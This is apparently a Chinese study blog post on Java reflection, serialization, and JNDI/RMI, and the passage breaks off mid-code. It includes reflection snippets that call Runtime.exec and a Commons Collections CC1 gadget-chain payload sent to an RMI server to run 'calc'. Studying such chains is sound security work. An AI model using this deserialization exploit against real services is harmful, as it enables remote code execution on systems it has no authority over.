<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;open&quot;</span>, <span class="string">&quot;-a&quot;</span>, <span class="string">&quot;Calculator&quot;</span>)));</span><br></pre></td></tr></table></figure>
<h3 id="getdeclaredmethod">getDeclaredMethod</h3>
<ol type="1">
<li>获取的包括私有方法，但不包括从父类基础的，其余的雷同
<strong>getMethod</strong></li>
<li>获取私有方法后需要 <strong>setAccessible(true)</strong></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(method.invoke(clazz), <span class="string">&quot;open -a Calculator&quot;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="getdeclaredconstructor">getDeclaredConstructor</h3>
<ol type="1">
<li>获取的包括私有方法，但不包括从父类基础的，其余的雷同
<strong>getConstructor</strong></li>
<li>获取私有方法后需要 <strong>setAccessible(true)</strong></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(constructor.newInstance(), <span class="string">&quot;open -a Calculator&quot;</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>此处 <strong>class</strong> 写为 <strong>clazz</strong>，是因为
<strong>class</strong> 为关键字，故 <strong>Class</strong>
类的实例化命名 <strong>class</strong> 会报错，常规是命名为
<strong>clazz</strong>。</p>
</blockquote>
<h2 id="总结">总结</h2>
<ol type="1">
<li>反射使用软引用 <strong>relectionData</strong> 缓存
<strong>class</strong> 信息，避免每次重新从 <strong>JVM</strong>
获取带来的开销；</li>
<li>反射调用多次生成新代理 <strong>Accessor</strong>,
而通过字节码生存的则考虑了卸载功能，所以会使用独立的类加载器；</li>
<li>当找到需要的方法，都会 <strong>copy</strong>
一份出来，而不是使用原来的实例，从而保证数据隔离；</li>
<li>调度反射方法，最终是由 <strong>JVM</strong> 执行
<strong>invoke0()</strong> 执行；</li>
<li>在 <strong>JVM</strong> 运行时如果存在有
<strong>SecurityManager</strong>，那么根据规则，可能会阻止
<strong>setAccessible(true)</strong> 来保证 <strong>JVM</strong>
核心库的安全。</li>
<li>反射调用时遵循多态原则，优先调用覆盖写法。</li>
</ol>
<h1 id="序列化与反序列化">序列化与反序列化</h1>
<p>在网络上传递消息的时候一般会用一些格式化的标准，比如
<strong>Json/XML</strong>，但其不支持复杂的数据类型。</p>
<p>因此，<strong>Jackson/Fastjson</strong> 等类库，会在
<strong>Json/XML</strong>
的基础上进行改造，通过特定的语法来传递对象；亦或者如
<strong>RMI</strong>，直接使用 <strong>Java</strong>
等语言内置的序列化方法，将一个对象转换成一串二进制数据进行传输。</p>
<p>而在 <strong>Java</strong> 中，<strong>ObjectOutputStream</strong>
类的 <strong>writeObject()</strong>
方法用于将对象转成二进制数据实现序列化。<strong>ObjectInputStream</strong>
类的 <strong>readObject()</strong>
方法用于将二进制数据转成对象实现反序列化。</p>
<p>序列化条件</p>
<ul>
<li>需要该类实现 <strong>Serializable/Externalizable</strong> 接口</li>
</ul>
<p>反序列化条件</p>
<ul>
<li>存在指定的类</li>
<li><strong>serialVersionUID</strong> 一致</li>
</ul>
<h2 id="例子">例子</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Cat</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Cat</span> <span class="variable">cat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;south&quot;</span>, <span class="number">7</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;out.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file));</span><br><span class="line">        oos.writeObject(cat);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file));</span><br><span class="line">        <span class="type">Cat</span> <span class="variable">newCat</span> <span class="operator">=</span> (Cat) ois.readObject();</span><br><span class="line">        System.out.println(newCat.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Cat&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream stream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        stream.defaultWriteObject();</span><br><span class="line">        stream.writeObject(<span class="string">&quot;miao&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream stream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        stream.defaultReadObject();</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> (String) stream.readObject();</span><br><span class="line">        System.out.println(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>文件转 <strong>16</strong> 进制字符串。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexdump -e <span class="string">&#x27;16/1 &quot;%02x&quot;&#x27;</span> out.txt</span><br></pre></td></tr></table></figure>
<p>然后 <strong>SerializationDumper</strong> 看看结构。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -jar SerializationDumper-v1<span class="number">.13</span>.jar <span class="string">&quot;aced000573720003436174232d6ccbfabb15200300024900036167654c00046e616d657400124c6a6176612f6c616e672f537472696e673b787000000007740005736f7574687400046d69616f78&quot;</span></span><br><span class="line"><span class="comment">// 开头两行是幻数</span></span><br><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line"><span class="comment">// 然后是内容 会有多个contents嵌套</span></span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">    TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">  		<span class="comment">// 类名的长度和值</span></span><br><span class="line">      className</span><br><span class="line">        Length - <span class="number">3</span> - <span class="number">0x00</span> <span class="number">03</span></span><br><span class="line">        Value - Cat - <span class="number">0x436174</span></span><br><span class="line">  		<span class="comment">// 生成的serialVersionUID</span></span><br><span class="line">      serialVersionUID - <span class="number">0x23</span> <span class="number">2d</span> 6c cb fa bb <span class="number">15</span> <span class="number">20</span></span><br><span class="line">  		<span class="comment">// 句柄值，类似于对象的ID</span></span><br><span class="line">      newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  		<span class="comment">// 为0x02时表示实现了Serializable接口，0x03表示还额外实现了writeObject方法</span></span><br><span class="line">      classDescFlags - <span class="number">0x03</span> - SC_WRITE_METHOD | SC_SERIALIZABLE</span><br><span class="line">  		<span class="comment">// 成员变量个数及类型、名称长度与值</span></span><br><span class="line">      fieldCount - <span class="number">2</span> - <span class="number">0x00</span> <span class="number">02</span></span><br><span class="line">      Fields</span><br><span class="line">        <span class="number">0</span>:</span><br><span class="line">          Int - I - <span class="number">0x49</span></span><br><span class="line">          fieldName</span><br><span class="line">            Length - <span class="number">3</span> - <span class="number">0x00</span> <span class="number">03</span></span><br><span class="line">            Value - age - <span class="number">0x616765</span></span><br><span class="line">        <span class="number">1</span>:</span><br><span class="line">          Object - L - <span class="number">0x4c</span></span><br><span class="line">          fieldName</span><br><span class="line">            Length - <span class="number">4</span> - <span class="number">0x00</span> <span class="number">04</span></span><br><span class="line">            Value - name - <span class="number">0x6e616d65</span></span><br><span class="line">          className1</span><br><span class="line">            TC_STRING - <span class="number">0x74</span></span><br><span class="line">              newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">01</span></span><br><span class="line">              Length - <span class="number">18</span> - <span class="number">0x00</span> <span class="number">12</span></span><br><span class="line">              Value - Ljava/lang/String; - <span class="number">0x4c6a6176612f6c616e672f537472696e673b</span></span><br><span class="line">      <span class="comment">// 这部分由annotateClass方法写入，默认是TC_ENDBLOCKDATA</span></span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - <span class="number">0x70</span></span><br><span class="line">    newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">02</span></span><br><span class="line">    <span class="comment">// 成员变量所赋的值</span></span><br><span class="line">    classdata</span><br><span class="line">      Cat</span><br><span class="line">        values</span><br><span class="line">          <span class="title function_">age</span></span><br><span class="line">            <span class="params">(<span class="type">int</span>)</span><span class="number">7</span> - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">07</span></span><br><span class="line">          name</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - <span class="number">0x74</span></span><br><span class="line">                newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">03</span></span><br><span class="line">                Length - <span class="number">5</span> - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">                Value - south - <span class="number">0x736f757468</span></span><br><span class="line">        <span class="comment">// 实现了writeObject方法后出现的字段，内容为写入的内容的属性值</span></span><br><span class="line">        objectAnnotation</span><br><span class="line">          TC_STRING - <span class="number">0x74</span></span><br><span class="line">            newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">04</span></span><br><span class="line">            Length - <span class="number">4</span> - <span class="number">0x00</span> <span class="number">04</span></span><br><span class="line">            Value - miao - <span class="number">0x6d69616f</span></span><br><span class="line">          TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br></pre></td></tr></table></figure>
<p>此处可以看见 <strong>writeObject</strong> 写入的数据在
<strong>objectAnnotation</strong> 字段的位置。</p>
<h2 id="待完善hashmap相关">待完善【HashMap相关——</h2>
<h1 id="jdni">JDNI</h1>
<p>全称为 <strong>Java Naming and Directory
Interface</strong>，规定了统一的通用的服务标准，是
<strong>J2EE/JakartaEE</strong> 中的重要规范之一。</p>
<p>命名服务将名称和对象进行关联，提供通过名称找到对象的操作。</p>
<p>目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性，提供创建、添加、删除目录对象以及修改目录对象属性等操作。</p>
<p>支持远程方法调用【<strong>RMI</strong>】，公共对象请求代理体系结构【<strong>CORBA</strong>】，轻型目录访问协议【<strong>LDAP</strong>】或域名服务【<strong>DNS</strong>】。</p>
<p>常见的两种分别是基于 <strong>RMI</strong> 和
<strong>LDAP</strong>。</p>
<ul>
<li>基于 <strong>LDAP</strong> 的利用方式：适用 <strong>JDK</strong>
版本：<strong>11.0.1/8u191/7u201/6u211 </strong>之前。
<ul>
<li><strong>8u191</strong> 更新中，对 <strong>LDAP</strong>
向量做了限制，并发布了
<strong>CVE-2018-3149</strong>，关闭了远程类加载。</li>
</ul></li>
<li>基于 <strong>RMI</strong> 的利用方式：适用 <strong>JDK</strong>
版本：<strong>6u132/7u122/8u113</strong> 之前。
<ul>
<li><strong>8u122</strong> 中加了反序列化白名单的机制，关闭了
<strong>RMI</strong> 远程加载代码。</li>
</ul></li>
</ul>
<h2 id="rmi">RMI</h2>
<p>全称为<strong>Remote Method
Invocation</strong>，是<strong>Java</strong>的远程方法调用，由<strong>Registry/Server/Client</strong>三部分组成。</p>
<h3 id="代理模式">代理模式</h3>
<figure>
<img src="/images/Study-Unserialize-Java/1.png" alt="img" />
<figcaption aria-hidden="true">img</figcaption>
</figure>
<ol type="1">
<li><strong>Server</strong>创建远程对象后向<strong>Registry</strong>注册。</li>
<li><strong>Client</strong>访问<strong>Registry</strong>并查找远程对象。</li>
<li><strong>Registry</strong>返回<strong>Stub</strong>。</li>
<li><strong>Client</strong>调用<strong>Stub</strong>与<strong>Skeleton</strong>通信。</li>
<li><strong>Skeleton</strong>代理调用服务后返回结果给<strong>Stub</strong>。</li>
<li><strong>Stub</strong>把结果返回给<strong>Client</strong>。</li>
</ol>
<blockquote>
<p>其中，<strong>Stub</strong>为<strong>Client</strong>的代理，<strong>Skeleton</strong>为<strong>Server</strong>的代理。</p>
</blockquote>
<p>代理模式中<strong>Server</strong>和<strong>Client</strong>皆有执行远程对象的方法，故可互相反序列化攻击。</p>
<h3 id="工厂模式">工厂模式</h3>
<figure>
<img src="/images/Study-Unserialize-Java/3.gif" alt="img" />
<figcaption aria-hidden="true">img</figcaption>
</figure>
<ol type="1">
<li><strong>Server</strong>创建<strong>Factory</strong>和<strong>Product</strong>，注册<strong>Reference</strong>关联两者。</li>
<li><strong>Server</strong>向<strong>Registry</strong>注册<strong>Factory</strong>。</li>
<li><strong>Client</strong>访问<strong>Registry</strong>并查找远程对象。</li>
<li><strong>Registry</strong>返回指向<strong>Factory</strong>的<strong>Reference</strong>。</li>
<li><strong>Client</strong>加载<strong>Factory</strong>，得到指向<strong>Product</strong>的<strong>Reference</strong>。</li>
<li><strong>Client</strong>加载<strong>Product</strong>。</li>
</ol>
<p>工厂模式中执行远程对象的方法的是<strong>Client</strong>，故是攻击<strong>Client</strong>的方式，是常说的<strong>JNDI</strong>注入。</p>
<p>安全问题在于可以对<a
href="https://github.com/NickstaDB/BaRMIe"><strong>RMI</strong>的方法进行探测</a>与<strong>Codebase</strong>的可控加载。</p>
<h3 id="正常服务实例">正常服务实例</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// CreatureInterface.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CreatureInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">  </span><br><span class="line">    String <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CatImpl.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CatImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">CreatureInterface</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">CatImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;miao&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RMIServer.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            Naming.rebind(<span class="string">&quot;creature&quot;</span>, <span class="keyword">new</span> <span class="title class_">CatImpl</span>());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RMIClient.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">CreatureInterface</span> <span class="variable">c</span> <span class="operator">=</span> (CreatureInterface) Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/creature&quot;</span>);</span><br><span class="line">            System.out.println(c.say());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>C/S</strong>结构。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">Client</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">RMIClient</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">CreatureInterface</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Sever</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">RMIServer</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">CreatureInterface</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">CatImpl</span></span><br></pre></td></tr></table></figure>
<p>因为接口的使用，客户端并不需要知道<strong>CatImpl</strong>的具体实现。</p>
<p>此处将<strong>Registry</strong>和<strong>Server</strong>一同实现了。</p>
<h3 id="攻击实例">攻击实例</h3>
<p>先借用一下<strong>CC1</strong>链子的实例。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// CreatureInterface.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CreatureInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">    Object <span class="title function_">eat</span><span class="params">(Object object)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CatImpl.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CatImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">CreatureInterface</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">CatImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;miao&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">eat</span><span class="params">(Object object)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RMIClient.java</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">CreatureInterface</span> <span class="variable">c</span> <span class="operator">=</span> (CreatureInterface) Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/creature&quot;</span>);</span><br><span class="line">            System.out.println(c.eat(getPayload(<span class="string">&quot;calc&quot;</span>)));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getPayload</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="codebase提一嘴">Codebase提一嘴</h3>
<p><strong>RMI</strong>支持动态类加载，如果有设置<strong>java.rmi.server.codebase</strong>，则在本地<strong>classpath</strong>找不到类的时候会去<strong>codebase</strong>的地址继续寻找并尝试加载。</p>
<h4 id="攻击条件">攻击条件</h4>
<ol type="1">
<li>安装配置了<strong>SecurityManager</strong></li>
<li><strong>Java</strong>版本低于<strong>7u21</strong>、<strong>6u45</strong>，或者设置<strong>java.rmi.server.useCodebaseOnly=false</strong></li>
</ol>
<h4 id="示例">示例</h4>
<h5 id="server">Server</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// RMIServer.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">SecurityManager</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            Naming.rebind(<span class="string">&quot;creature&quot;</span>, <span class="keyword">new</span> <span class="title class_">CatImpl</span>());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CreatureInterface.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CreatureInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">    Object <span class="title function_">eat</span><span class="params">(Object object)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">    Integer <span class="title function_">calc</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CatImpl.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span 